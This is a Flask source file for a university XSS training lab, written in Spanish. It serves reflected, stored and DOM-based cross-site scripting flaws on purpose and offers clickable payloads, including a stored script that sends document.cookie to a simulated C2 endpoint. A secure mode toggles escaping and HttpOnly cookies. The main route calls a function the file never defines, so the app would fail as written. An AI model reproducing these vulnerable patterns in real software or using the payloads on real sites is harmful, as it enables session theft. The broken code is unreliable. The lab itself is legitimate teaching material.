#!/usr/bin/env python3
"""
Laboratorio de Seguridad Web: Security Workbench (XSS - CWE-79)
Asignatura: Gestión de Seguridad en Sistemas Informáticos - UNICAES
Autores: Dennis Guevara, Mario Villeda, Luis Balcaceres
"""

from flask import Flask, request, render_template_string, make_response, redirect, url_for, jsonify
import html
import datetime

app = Flask(__name__)
app.secret_key = "clave_secreta_laboratorio_seguridad"

# Registros de eventos interceptados por el servidor atacante simulado
logs_ataques = []

# Base de datos en memoria para el tablón de comentarios
comentarios_db = [
    {
        "id": 1,
        "autor": "Ingeniero Catedrático",
        "mensaje": "Bienvenidos al taller evaluado de XSS. A la izquierda interactúan con el portal y a la derecha auditan el flujo en el Debugger.",
        "seguro": True,
        "fecha": "10/11/2026 08:30"
    }
]

# Configuración global del modo de seguridad
configuracion = {
    "modo_seguro": False,
    "csp_activo": False,
    "httponly_activo": False
}

PLANTILLA_WORKBENCH = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNICAES | Security Workbench (Laboratorio XSS)</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        body { background-color: #0b1120; color: #f1f5f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; height: 100vh; overflow-x: hidden; }
        .navbar-custom { background-color: #111827; border-bottom: 2px solid #1f2937; }
        .card-custom { background-color: #111827; border: 1px solid #1f2937; border-radius: 10px; }
        .card-app { border-top: 4px solid #0284c7; }
        .card-debugger { border-top: 4px solid #f59e0b; }
        .card-c2 { border-top: 4px solid #ef4444; }

        /* PIPELINE DEL DEBUGGER */
        .pipeline-container { display: flex; align-items: stretch; justify-content: space-between; gap: 8px; margin: 10px 0; }
        .pipeline-step { flex: 1; background: #131c2e; border: 2px solid #334155; border-radius: 8px; padding: 10px 6px; text-align: center; font-size: 11.5px; transition: all 0.25s ease; opacity: 0.6; position: relative; }
        .pipeline-step.step-paused { opacity: 1; transform: scale(1.03); border-color: #38bdf8; background: #0c4a6e; box-shadow: 0 0 16px rgba(56, 189, 248, 0.7); }
        .pipeline-step.step-vuln { opacity: 1; border-color: #ef4444; background: #450a0a; color: #fecaca; }
        .pipeline-step.step-blocked { opacity: 1; border-color: #10b981; background: #064e3b; color: #a7f3d0; box-shadow: 0 0 16px rgba(16, 185, 129, 0.6); }

        .breakpoint-tag { font-size: 9.5px; font-weight: bold; background: #0284c7; color: #fff; padding: 2px 6px; border-radius: 10px; display: inline-block; margin-bottom: 4px; }
        .pipeline-arrow { display: flex; align-items: center; justify-content: center; font-size: 18px; color: #475569; }
        .pipeline-arrow.arrow-passed { color: #38bdf8; font-weight: bold; }

        /* SCOPE WATCHER */
        .debug-scope-panel { background-color: #030712; border: 1.5px solid #1f2937; border-radius: 6px; padding: 10px 14px; font-family: 'Consolas', monospace; font-size: 11.5px; color: #38bdf8; }
        .debug-var-row { display: flex; justify-content: space-between; border-bottom: 1px solid #1e293b; padding: 3px 0; }
        .debug-var-name { color: #facc15; font-weight: bold; }
        .debug-var-val { color: #f1f5f9; max-width: 65%; text-align: right; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

        /* TERMINAL C2 */
        .hacker-terminal { background-color: #030712; border: 1.5px solid #22c55e; border-radius: 8px; padding: 12px; font-family: 'Consolas', monospace; font-size: 11px; color: #4ade80; height: 180px; overflow-y: auto; box-shadow: inset 0 0 10px rgba(0,0,0,0.9); }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }

        .chip-payload { cursor: pointer; font-family: monospace; font-size: 11px; background: #1e293b; border: 1px solid #334155; color: #facc15; padding: 3px 8px; border-radius: 6px; transition: 0.2s; }
        .chip-payload:hover { background: #334155; color: #fff; border-color: #38bdf8; }
        .code-box { background-color: #030712; border: 1px solid #1f2937; border-radius: 6px; padding: 8px 12px; font-family: monospace; color: #38bdf8; font-size: 11px; }
    </style>
</head>
<body>
    <!-- Navbar Superior -->
    <nav class="navbar navbar-expand-lg navbar-dark navbar-custom py-2 px-3">
        <div class="container-fluid">
            <a class="navbar-brand d-flex align-items-center gap-2 fw-bold fs-6" href="/">
                <i class="bi bi-shield-shaded text-primary fs-4"></i>
                <span>UNICAES | Security Workbench (Auditoría XSS)</span>
            </a>
            <div class="d-flex align-items-center gap-2">
                <span class="badge {{ 'bg-success' if configuracion.modo_seguro else 'bg-danger' }} px-3 py-2">
                    {{ 'MODO SEGURO (Defensas Activas)' if configuracion.modo_seguro else 'MODO VULNERABLE (Sin Filtrado)' }}
                </span>
                <a href="/toggle-modo" class="btn btn-sm {{ 'btn-outline-danger' if configuracion.modo_seguro else 'btn-outline-success' }} fw-bold">
                    {{ 'Cambiar a Modo Vulnerable' if configuracion.modo_seguro else 'Activar Defensas (Modo Seguro)' }}
                </a>
            </div>
        </div>
    </nav>

    <!-- WORKBENCH: 2 COLUMNAS (50% App / 50% Inspector) -->
    <div class="container-fluid px-3 py-3">
        <div class="row g-3">
            
            <!-- ==============================================
                 COLUMNA IZQUIERDA: APLICACIÓN WEB OBJETIVO
            =============================================== -->
            <div class="col-lg-6">
                <div class="card card-custom card-app p-3 shadow-sm h-100">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <h6 class="mb-0 text-primary fw-bold">
                            <i class="bi bi-window-desktop"></i> Portal Web Académico (Aplicación Objetivo)
                        </h6>
                        <span class="badge bg-secondary" style="font-size:10px;">Contexto del Usuario / Víctima</span>
                    </div>

                    <!-- Pestañas de la Aplicación -->
                    <ul class="nav nav-pills nav-fill mb-3" id="appTabs">
                        <li class="nav-item">
                            <button class="nav-link active py-1 small" data-bs-toggle="pill" data-bs-target="#tab-reflejado">
                                <i class="bi bi-search"></i> 1. Reflejado (Búsqueda)
                            </button>
                        </li>
                        <li class="nav-item">
                            <button class="nav-link py-1 small" data-bs-toggle="pill" data-bs-target="#tab-almacenado">
                                <i class="bi bi-chat-dots"></i> 2. Almacenado (Tablón)
                            </button>
                        </li>
                        <li class="nav-item">
                            <button class="nav-link py-1 small" data-bs-toggle="pill" data-bs-target="#tab-dom">
                                <i class="bi bi-code-slash"></i> 3. DOM (Cliente)
                            </button>
                        </li>
                    </ul>

                    <div class="tab-content flex-grow-1">
                        
                        <!-- TAB 1: XSS REFLEJADO -->
                        <div class="tab-pane fade show active" id="tab-reflejado">
                            <label class="form-label text-light small fw-bold mb-1">Búsqueda en Portal:</label>
                            <div class="input-group mb-2">
                                <input type="text" id="input-busqueda" class="form-control form-control-sm bg-dark text-light border-secondary" 
                                       placeholder="Término de búsqueda o payload...">
                                <button class="btn btn-sm btn-primary" onclick="ejecutarBusqueda(false)"><i class="bi bi-search"></i> Ejecutar</button>
                                <button class="btn btn-sm btn-warning fw-bold text-dark" onclick="ejecutarBusqueda(true)"><i class="bi bi-bug-fill"></i> 🐞 Depurar</button>
                            </div>

                            <div class="mb-2">
                                <small class="text-secondary d-block mb-1">Cargas útiles rápidas (haz clic para insertar):</small>
                                <div class="d-flex flex-wrap gap-1">
                                    <span class="chip-payload" onclick="cargarChip('&lt;script&gt;alert(\\'XSS_Reflejado\\')&lt;/script&gt;')">&lt;script&gt;alert(1)&lt;/script&gt;</span>
                                    <span class="chip-payload" onclick="cargarChip('&lt;img src=x onerror=alert(\\'Evento_onerror\\')&gt;')">&lt;img src=x onerror=...&gt;</span>
                                    <span class="chip-payload" onclick="cargarChip('&lt;u&gt;&lt;h4 style=\\'color:cyan\\'\\&gt;Defacement&lt;/h4&gt;&lt;/u&gt;')">Defacement HTML</span>
                                </div>
                            </div>

                            <div class="p-2 bg-dark rounded border border-secondary mb-2" style="min-height: 80px;">
                                <small class="text-secondary d-block">Resultado renderizado en el navegador:</small>
                                <div id="resultado-busqueda" class="mt-1 text-light small">
                                    <span class="text-muted">Introduce una consulta o pulsa "Depurar".</span>
                                </div>
                            </div>

                            <div class="code-box">
                                <span class="text-secondary">// Análisis de Código:</span><br>
                                {% if configuracion.modo_seguro %}
                                <span class="text-success">SEGURO: return render("&lt;p&gt;Resultados: " + html.escape(query))</span>
                                {% else %}
                                <span class="text-danger">VULNERABLE: return render("&lt;p&gt;Resultados: " + query) // Concatena en bruto</span>
                                {% endif %}
                            </div>
                        </div>

                        <!-- TAB 2: XSS ALMACENADO -->
                        <div class="tab-pane fade" id="tab-almacenado">
                            <div class="row g-2 mb-2">
                                <div class="col-4">
                                    <input type="text" id="comentario-autor" class="form-control form-control-sm bg-dark text-light border-secondary" value="Auditor Estudiantil" placeholder="Tu nombre">
                                </div>
                                <div class="col-8">
                                    <input type="text" id="comentario-mensaje" class="form-control form-control-sm bg-dark text-light border-secondary" placeholder="Mensaje para el tablón...">
                                </div>
                            </div>

                            <div class="d-flex justify-content-between align-items-center mb-2">
                                <div class="d-flex gap-1">
                                    <button class="btn btn-sm btn-primary" onclick="publicarComentario(false)"><i class="bi bi-send-fill"></i> Publicar</button>
                                    <button class="btn btn-sm btn-warning fw-bold text-dark" onclick="publicarComentario(true)"><i class="bi bi-bug-fill"></i> 🐞 Publicar y Depurar</button>
                                </div>
                                <button class="btn btn-sm btn-outline-secondary py-0" onclick="resetearTablon()"><i class="bi bi-trash"></i> Limpiar</button>
                            </div>

                            <div class="mb-2 d-flex flex-wrap gap-1">
                                <span class="chip-payload" onclick="cargarComentarioChip('&lt;script&gt;alert(\\'XSS_Almacenado_Persistente\\')&lt;/script&gt;')">Alerta XSS</span>
                                <span class="chip-payload" onclick="cargarComentarioChip('&lt;script&gt;fetch(\\'/api/exfiltrar?vector=XSS_Almacenado&amp;datos=\\' + document.cookie)&lt;/script&gt;Comentario legítimo')">Robo de Cookie al C2</span>
                                <span class="chip-payload" onclick="cargarComentarioChip('&lt;img src=x onerror=alert(document.cookie)&gt;')">&lt;img onerror=alert(cookie)&gt;</span>
                            </div>

                            <div class="p-2 bg-dark rounded border border-secondary" id="lista-comentarios" style="max-height: 180px; overflow-y: auto;">
                                {% for c in comentarios %}
                                <div class="border-bottom border-secondary py-1 small">
                                    <div class="d-flex justify-content-between">
                                        <strong class="text-primary">{{ c.autor }}</strong>
                                        <span class="badge {{ 'bg-success' if c.seguro else 'bg-danger' }}" style="font-size:9px;">
                                            {{ 'Sanitizado' if c.seguro else 'Raw' }}
                                        </span>
                                    </div>
                                    <div class="text-light">{{ c.mensaje|safe if not configuracion.modo_seguro else c.mensaje }}</div>
                                </div>
                                {% endfor %}
                            </div>
                        </div>

                        <!-- TAB 3: XSS EN DOM -->
                        <div class="tab-pane fade" id="tab-dom">
                            <p class="text-secondary small mb-2">
                                Manipulación en el cliente. El servidor no interviene; JavaScript lee <code>location.hash</code> y escribe en el DOM.
                            </p>
                            <div class="d-flex gap-2 mb-2">
                                <button class="btn btn-sm btn-outline-danger" onclick="ejecutarDOM('vulnerable')">
                                    <i class="bi bi-bug-fill"></i> 🐞 Ejecutar innerHTML (Vulnerable)
                                </button>
                                <button class="btn btn-sm btn-outline-success" onclick="ejecutarDOM('seguro')">
                                    <i class="bi bi-shield-check"></i> Ejecutar textContent (Seguro)
                                </button>
                            </div>
                            <div class="p-2 bg-dark rounded border border-secondary mb-2">
                                <small class="text-secondary d-block">Salida en DOM del Navegador:</small>
                                <div id="dom-resultado" class="text-light small mt-1">Esperando ejecución...</div>
                            </div>
                            <div class="code-box">
                                <span class="text-danger">// Inseguro: contenedor.innerHTML = location.hash;</span><br>
                                <span class="text-success">// Seguro: contenedor.textContent = location.hash;</span>
                            </div>
                        </div>

                    </div>
                </div>
            </div>

            <!-- ==============================================
                 COLUMNA DERECHA: SECURITY INSPECTOR SUITE
            =============================================== -->
            <div class="col-lg-6">
                <!-- Panel Superior: Debugger Paso a Paso -->
                <div class="card card-custom card-debugger p-3 shadow-sm mb-3">
                    <div class="d-flex justify-content-between align-items-center mb-2 pb-1 border-bottom border-secondary">
                        <div class="d-flex align-items-center gap-2">
                            <h6 class="mb-0 text-warning fw-bold"><i class="bi bi-bug"></i> Pipeline Debugger en Vivo</h6>
                            <span class="badge bg-dark border border-secondary" id="debug-step-badge">Paso 0 / 4</span>
                        </div>
                        <div class="d-flex gap-1">
                            <button class="btn btn-sm btn-warning text-dark fw-bold py-0 px-2" id="btn-next-step" onclick="avanzarStepDebugger()" disabled>
                                <i class="bi bi-skip-forward-fill"></i> Paso ❯ (F10)
                            </button>
                            <button class="btn btn-sm btn-outline-light py-0 px-2" id="btn-auto" onclick="toggleAutoPlay()" disabled>
                                <i class="bi bi-play-fill"></i> Auto
                            </button>
                            <button class="btn btn-sm btn-outline-secondary py-0 px-2" onclick="resetearDebuggerUI()">
                                <i class="bi bi-arrow-counterclockwise"></i> Reset
                            </button>
                        </div>
                    </div>

                    <!-- Diagrama de 4 Breakpoints -->
                    <div class="pipeline-container">
                        <div class="pipeline-step" id="step-1">
                            <span class="breakpoint-tag">BP 1</span>
                            <div class="fw-bold"><i class="bi bi-box-arrow-in-right text-info"></i> 1. Source</div>
                            <div class="text-muted" style="font-size:10px;" id="s1-status">Input usuario</div>
                        </div>
                        <div class="pipeline-arrow" id="arr-1">➔</div>
                        <div class="pipeline-step" id="step-2">
                            <span class="breakpoint-tag">BP 2</span>
                            <div class="fw-bold"><i class="bi bi-server text-warning"></i> 2. Backend</div>
                            <div class="text-muted" style="font-size:10px;" id="s2-status">Filtro / Escape</div>
                        </div>
                        <div class="pipeline-arrow" id="arr-2">➔</div>
                        <div class="pipeline-step" id="step-3">
                            <span class="breakpoint-tag">BP 3</span>
                            <div class="fw-bold"><i class="bi bi-browser-chrome text-primary"></i> 3. Cliente</div>
                            <div class="text-muted" style="font-size:10px;" id="s3-status">Parser DOM</div>
                        </div>
                        <div class="pipeline-arrow" id="arr-3">➔</div>
                        <div class="pipeline-step" id="step-4">
                            <span class="breakpoint-tag">BP 4</span>
                            <div class="fw-bold"><i class="bi bi-lightning-fill text-danger"></i> 4. Impacto</div>
                            <div class="text-muted" style="font-size:10px;" id="s4-status">C2 Exfiltración</div>
                        </div>
                    </div>

                    <!-- Scope Variables Watcher -->
                    <div class="debug-scope-panel">
                        <div class="debug-var-row">
                            <span class="debug-var-name">Variable 'payload':</span>
                            <span class="debug-var-val" id="var-payload">Ninguna en ejecución</span>
                        </div>
                        <div class="debug-var-row">
                            <span class="debug-var-name">Mecanismo Filtro:</span>
                            <span class="debug-var-val" id="var-filtro">{{ 'html.escape() ACTIVO' if configuracion.modo_seguro else 'Sin escape (RAW HTML)' }}</span>
                        </div>
                        <div class="debug-var-row">
                            <span class="debug-var-name">Protección HttpOnly:</span>
                            <span class="debug-var-val" id="var-httponly">{{ 'ACTIVA (Cookie Inaccesible)' if configuracion.httponly_activo else 'DESACTIVADA (document.cookie expuesto)' }}</span>
                        </div>
                        <div class="mt-1 pt-1 border-top border-dark text-warning small" id="debug-log-msg" style="font-size:11px;">
                            <i class="bi bi-info-circle"></i> Pulsa <strong>"🐞 Depurar"</strong> en cualquier escenario para iniciar la inspección paso a paso.
                        </div>
                    </div>
                </div>

                <!-- Panel Inferior: Terminal C2 (Listener Atacante) -->
                <div class="card card-custom card-c2 p-3 shadow-sm">
                    <div class="d-flex justify-content-between align-items-center mb-1 pb-1 border-bottom border-secondary">
                        <div class="d-flex align-items-center gap-2">
                            <h6 class="mb-0 text-danger fw-bold"><i class="bi bi-terminal-fill"></i> Servidor C2 (Exfiltración en Tiempo Real)</h6>
                            <span class="text-success blink" style="font-size:10px;">● ONLINE</span>
                        </div>
                        <button class="btn btn-sm btn-outline-secondary py-0 px-2" onclick="limpiarC2Logs()"><i class="bi bi-trash"></i></button>
                    </div>

                    <div class="hacker-terminal" id="c2-console">
                        <div class="text-muted">// Esperando tráfico de exfiltración...</div>
                        {% for l in logs %}
                        <div class="border-bottom border-dark pb-1 mb-1">
                            <span class="text-secondary">[{{ l.hora }}]</span> <strong class="text-danger">[CONEXIÓN]</strong> {{ l.vector }}<br>
                            <span class="text-warning">DATA:</span> <code>{{ l.datos }}</code>
                        </div>
                        {% endfor %}
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const MODO_SEGURO = {{ 'true' if configuracion.modo_seguro else 'false' }};

        // ESTADO DEL DEBUGGER
        let pasoActual = 0;
        let payloadActual = '';
        let vectorActual = '';
        let callbackExito = null;
        let autoTimer = null;

        function iniciarDebug(vector, payload, callback) {
            resetearDebuggerUI();
            payloadActual = payload;
            vectorActual = vector;
            callbackExito = callback;
            document.getElementById('var-payload').innerText = payload;
            
            document.getElementById('btn-next-step').disabled = false;
            document.getElementById('btn-auto').disabled = false;
            avanzarStepDebugger();
        }

        function avanzarStepDebugger() {
            pasoActual++;
            document.getElementById('debug-step-badge').innerText = 'Paso ' + pasoActual + ' / 4';

            if (pasoActual === 1) {
                // PASO 1: SOURCE
                setStepStyle(1, 'step-paused', 'Capturado en Input');
                document.getElementById('debug-log-msg').innerHTML = '<strong>[PASO 1 - SOURCE]:</strong> Carga inyectada: <code>' + escapeHtml(payloadActual.substring(0, 30)) + '</code>. Pulsa F10 para ver la respuesta del servidor.';
            } 
            else if (pasoActual === 2) {
                // PASO 2: BACKEND
                document.getElementById('arr-1').className = 'pipeline-arrow arrow-passed';
                setStepStyle(1, 'step-vuln', 'Enviado');

                if (vectorActual.includes('DOM')) {
                    setStepStyle(2, 'step-paused', 'Omitido (Cliente)');
                    document.getElementById('debug-log-msg').innerHTML = '<span class="text-info fw-bold"><i class="bi bi-info-circle"></i> [PASO 2 - DOM XSS]:</span> <strong>El servidor backend es omitido.</strong> La carga permanece en el navegador (fuente: location.hash / JS cliente). Pulsa F10 para ver la escritura en el Sink inseguro.';
                } else if (MODO_SEGURO) {
                    // MITIGADO EN BACKEND
                    setStepStyle(2, 'step-blocked', 'html.escape() Bloqueó');
                    document.getElementById('debug-log-msg').innerHTML = '<span class="text-success fw-bold"><i class="bi bi-shield-check"></i> [PASO 2 - MITIGADO]:</span> El servidor aplicó codificación de entidades. Los caracteres &lt; y &gt; se convirtieron en texto plano inocuo. El ataque finalizó aquí de forma segura.';
                    if (callbackExito) callbackExito(true);
                    detenerAuto();
                    document.getElementById('btn-next-step').disabled = true;
                    return;
                } else {
                    setStepStyle(2, 'step-vuln', 'Concatenado sin escapar');
                    document.getElementById('debug-log-msg').innerHTML = '<span class="text-danger fw-bold"><i class="bi bi-exclamation-triangle"></i> [PASO 2 - VULNERABLE]:</span> El servidor emitió la carga íntegra en la respuesta HTML. Pulsa F10 para ver la interpretación del navegador.';
                }
            }
            else if (pasoActual === 3) {
                // PASO 3: DOM PARSER
                document.getElementById('arr-2').className = 'pipeline-arrow arrow-passed';
                setStepStyle(3, 'step-paused', 'DOM Ejecuta');
                document.getElementById('debug-log-msg').innerHTML = '<strong>[PASO 3 - NAVEGADOR]:</strong> El motor de renderizado interpreta la etiqueta y ejecuta el código en el contexto de seguridad del origen.';
            }
            else if (pasoActual === 4) {
                // PASO 4: C2 EXFILTRACIÓN
                document.getElementById('arr-3').className = 'pipeline-arrow arrow-passed';
                setStepStyle(3, 'step-vuln', 'Ejecutado');
                setStepStyle(4, 'step-vuln', 'Exfiltrado al C2');
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-danger fw-bold"><i class="bi bi-skull"></i> [PASO 4 - COMPROMISO TOTAL]:</span> document.cookie fue transmitido hacia la terminal C2 inferior.';

                // Disparar la acción en la app y enviar al C2
                if (callbackExito) callbackExito(false);
                exfiltrarAlC2(vectorActual);

                detenerAuto();
                document.getElementById('btn-next-step').disabled = true;
            }

            if (autoTimer && pasoActual < 4 && !MODO_SEGURO) {
                autoTimer = setTimeout(avanzarStepDebugger, 1200);
            }
        }

        function setStepStyle(stepNum, styleClass, text) {
            const el = document.getElementById('step-' + stepNum);
            el.className = 'pipeline-step ' + styleClass;
            document.getElementById('s' + stepNum + '-status').innerText = text;
        }

        function toggleAutoPlay() {
            if (autoTimer) {
                detenerAuto();
            } else {
                document.getElementById('btn-auto').className = 'btn btn-sm btn-light py-0 px-2 fw-bold text-dark';
                autoTimer = setTimeout(avanzarStepDebugger, 300);
            }
        }

        function detenerAuto() {
            if (autoTimer) {
                clearTimeout(autoTimer);
                autoTimer = null;
            }
            document.getElementById('btn-auto').className = 'btn btn-sm btn-outline-light py-0 px-2';
        }

        function resetearDebuggerUI() {
            detenerAuto();
            pasoActual = 0;
            payloadActual = '';
            vectorActual = '';
            callbackExito = null;

            for (let i = 1; i <= 4; i++) {
                document.getElementById('step-' + i).className = 'pipeline-step';
            }
            document.getElementById('s1-status').innerText = 'Input usuario';
            document.getElementById('s2-status').innerText = 'Filtro / Escape';
            document.getElementById('s3-status').innerText = 'Parser DOM';
            document.getElementById('s4-status').innerText = 'C2 Exfiltración';

            for (let i = 1; i <= 3; i++) {
                document.getElementById('arr-' + i).className = 'pipeline-arrow';
            }

            document.getElementById('btn-next-step').disabled = true;
            document.getElementById('btn-auto').disabled = true;
            document.getElementById('debug-step-badge').innerText = 'Paso 0 / 4';
            document.getElementById('var-payload').innerText = 'Ninguna en ejecución';
            document.getElementById('debug-log-msg').innerHTML = '<i class="bi bi-info-circle"></i> Pulsa <strong>"🐞 Depurar"</strong> en cualquier escenario para iniciar la inspección paso a paso.';
        }

        // ================= ACCIONES DE LA APP OBJETIVO =================

        function cargarChip(payload) {
            document.getElementById('input-busqueda').value = payload;
        }

        function cargarComentarioChip(payload) {
            document.getElementById('comentario-mensaje').value = payload;
        }

        function ejecutarBusqueda(conDebug) {
            const q = document.getElementById('input-busqueda').value.trim();
            if (!q) return;

            const accionFinal = (esMitigado) => {
                const res = document.getElementById('resultado-busqueda');
                if (esMitigado) {
                    res.innerHTML = "Resultados para: <strong>" + escapeHtml(q) + "</strong> (Procesado como texto seguro)";
                } else {
                    res.innerHTML = "Resultados para: <strong>" + q + "</strong>";
                    // Forzar ejecución de etiquetas script en inyecciones DOM simuladas
                    const scripts = res.querySelectorAll('script');
                    scripts.forEach(s => {
                        const nuevo = document.createElement('script');
                        nuevo.textContent = s.textContent;
                        document.body.appendChild(nuevo);
                    });
                }
            };

            if (conDebug) {
                iniciarDebug('XSS Reflejado (Buscador)', q, accionFinal);
            } else {
                accionFinal(MODO_SEGURO);
                if (!MODO_SEGURO && (q.includes('<script') || q.includes('onerror'))) {
                    exfiltrarAlC2('XSS Reflejado Directo');
                }
            }
        }

        function publicarComentario(conDebug) {
            const autor = document.getElementById('comentario-autor').value.trim() || 'Anónimo';
            const mensaje = document.getElementById('comentario-mensaje').value.trim();
            if (!mensaje) return;

            const accionFinal = (esMitigado) => {
                fetch('/api/comentario', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ autor: autor, mensaje: mensaje })
                })
                .then(r => r.json())
                .then(data => {
                    recargarComentariosDOM(data.comentarios);
                    document.getElementById('comentario-mensaje').value = '';
                });
            };

            if (conDebug) {
                iniciarDebug('XSS Almacenado (Tablón)', mensaje, accionFinal);
            } else {
                accionFinal(MODO_SEGURO);
                if (!MODO_SEGURO && (mensaje.includes('<script') || mensaje.includes('onerror'))) {
                    exfiltrarAlC2('XSS Almacenado Directo');
                }
            }
        }

        function recargarComentariosDOM(comentarios) {
            const list = document.getElementById('lista-comentarios');
            let htmlStr = '';
            comentarios.slice().reverse().forEach(c => {
                const badge = c.seguro ? '<span class="badge bg-success" style="font-size:9px;">Sanitizado</span>' : '<span class="badge bg-danger" style="font-size:9px;">Raw</span>';
                const bodyMsg = MODO_SEGURO ? escapeHtml(c.mensaje) : c.mensaje;
                htmlStr += `
                <div class="border-bottom border-secondary py-1 small">
                    <div class="d-flex justify-content-between">
                        <strong class="text-primary">${escapeHtml(c.autor)}</strong>
                        ${badge}
                    </div>
                    <div class="text-light">${bodyMsg}</div>
                </div>
                `;
            });
            list.innerHTML = htmlStr;
            if (!MODO_SEGURO) {
                const scripts = list.querySelectorAll('script');
                scripts.forEach(s => {
                    const nuevo = document.createElement('script');
                    nuevo.textContent = s.textContent;
                    document.body.appendChild(nuevo);
                });
            }
        }

        function resetearTablon() {
            fetch('/api/reset-comentarios', { method: 'POST' })
                .then(r => r.json())
                .then(data => recargarComentariosDOM(data.comentarios));
        }

        function ejecutarDOM(tipo) {
            const cont = document.getElementById('dom-resultado');
            if (tipo === 'seguro') {
                cont.textContent = "Bienvenido <img src=x onerror=alert('Bloqueado')> (Procesado con textContent)";
                resetearDebuggerUI();
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-success"><i class="bi bi-shield-check"></i> Seguro:</span> <code>textContent</code> forzó al navegador a tratar los delimitadores como texto plano.';
            } else {
                const payload = '<img src=x onerror="exfiltrarAlC2(\\'DOM XSS\\'); alert(\\'DOM XSS Ejecutado\\')">';
                iniciarDebug('DOM XSS (innerHTML)', payload, () => {
                    cont.innerHTML = "Bienvenido " + payload;
                });
            }
        }

        // ================= C2 COMUNICACIÓN =================

        function exfiltrarAlC2(vector) {
            const cookie = document.cookie;
            let datos = '';
            if (!cookie || cookie.trim() === '') {
                datos = '[BLOQUEADO: No hay cookies legibles desde JavaScript]';
            } else if (cookie.includes('session_auth_token')) {
                datos = '[CRÍTICO: Token Robado] ' + cookie;
            } else {
                datos = '[DEFENSA ACTIVA: session_auth_token blindado por HttpOnly] Cookies legibles: ' + cookie;
            }
            fetch('/api/exfiltrar?vector=' + encodeURIComponent(vector) + '&datos=' + encodeURIComponent(datos))
                .then(r => r.json())
                .then(() => actualizarConsolaC2());
        }

        function actualizarConsolaC2() {
            fetch('/api/logs')
                .then(r => r.json())
                .then(logs => {
                    const box = document.getElementById('c2-console');
                    if (logs.length === 0) {
                        box.innerHTML = '<div class="text-muted">// Esperando tráfico de exfiltración...</div>';
                        return;
                    }
                    let out = '';
                    logs.forEach(l => {
                        const color = l.datos.includes('BLOQUEADO') ? 'text-success' : 'text-warning';
                        out += `
                        <div class="border-bottom border-dark pb-1 mb-1">
                            <span class="text-secondary">[${l.hora}]</span> <strong class="${l.datos.includes('BLOQUEADO') ? 'text-info' : 'text-danger'}">[CONEXIÓN]</strong> ${escapeHtml(l.vector)}<br>
                            <span class="text-light">DATA:</span> <code class="${color}">${escapeHtml(l.datos)}</code>
                        </div>
                        `;
                    });
                    box.innerHTML = out;
                    box.scrollTop = box.scrollHeight;
                });
        }

        function limpiarC2Logs() {
            fetch('/api/limpiar-logs', { method: 'POST' }).then(() => {
                document.getElementById('c2-console').innerHTML = '<div class="text-muted">// Consola limpia.</div>';
            });
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        // Atajo F10 para avanzar el debugger
        window.addEventListener('keydown', (e) => {
            if (e.key === 'F10' && !document.getElementById('btn-next-step').disabled) {
                e.preventDefault();
                avanzarStepDebugger();
            }
        });

        setInterval(actualizarConsolaC2, 3000);
    </script>
</body>
</html>
"""

# ----------------- ENDPOINTS API -----------------

@app.route("/")
def index():
    resp = make_response(render_template_string(PLANTILLA_WORKBENCH, 
                                                 configuracion=configuracion, 
                                                 comentarios=comentarios_db, 
                                                 logs=logs_ataques))
    asegurar_cookies(resp)
    aplicar_cabeceras_seguridad(resp)
    return resp

@app.route("/toggle-modo")
def toggle_modo():
    configuracion["modo_seguro"] = not configuracion["modo_seguro"]
    configuracion["csp_activo"] = configuracion["modo_seguro"]
    configuracion["httponly_activo"] = configuracion["modo_seguro"]
    resp = redirect("/")
    resp.set_cookie("session_auth_token", "AUTH_TOKEN_UNICAES_SEC_987654321", 
                    httponly=configuracion["httponly_activo"], samesite="Lax")
    return resp

@app.route("/api/comentario", methods=["POST"])
def api_comentario():
    global comentarios_db
    data = request.get_json() or {}
    autor = data.get("autor", "Anónimo")
    mensaje = data.get("mensaje", "")
    
    if mensaje.strip():
        if configuracion["modo_seguro"]:
            autor = html.escape(autor)
            mensaje = html.escape(mensaje)
        comentarios_db.append({
            "id": len(comentarios_db) + 1,
            "autor": autor,
            "mensaje": mensaje,
            "seguro": configuracion["modo_seguro"],
            "fecha": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        })
    return jsonify({"status": "ok", "comentarios": comentarios_db})

@app.route("/api/reset-comentarios", methods=["POST"])
def api_reset_comentarios():
    global comentarios_db
    comentarios_db = [
        {"id": 1, "autor": "Ingeniero Catedrático", "mensaje": "Bienvenidos al taller de XSS. A la izquierda interactúan con el portal y a la derecha auditan el flujo en el Debugger.", "seguro": True, "fecha": "10/11/2026 08:30"}
    ]
    return jsonify({"status": "ok", "comentarios": comentarios_db})

@app.route("/api/exfiltrar", methods=["GET", "POST"])
def api_exfiltrar():
    global logs_ataques
    vector = request.args.get("vector", "Inyección")
    datos = request.args.get("datos", "Sin datos")
    
    nuevo_log = {
        "hora": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.remote_addr,
        "vector": vector,
        "datos": datos
    }
    logs_ataques.append(nuevo_log)
    if len(logs_ataques) > 20:
        logs_ataques.pop(0)
    return jsonify({"status": "recibido"})

@app.route("/api/logs")
def api_logs():
    return jsonify(logs_ataques)

@app.route("/api/limpiar-logs", methods=["POST"])
def api_limpiar_logs():
    global logs_ataques
    logs_ataques = []
    return jsonify({"status": "limpio"})

def asegurar_cookies(resp):
    resp.set_cookie("session_auth_token", "AUTH_TOKEN_UNICAES_SEC_987654321", 
                    httponly=configuracion["httponly_activo"], samesite="Lax")
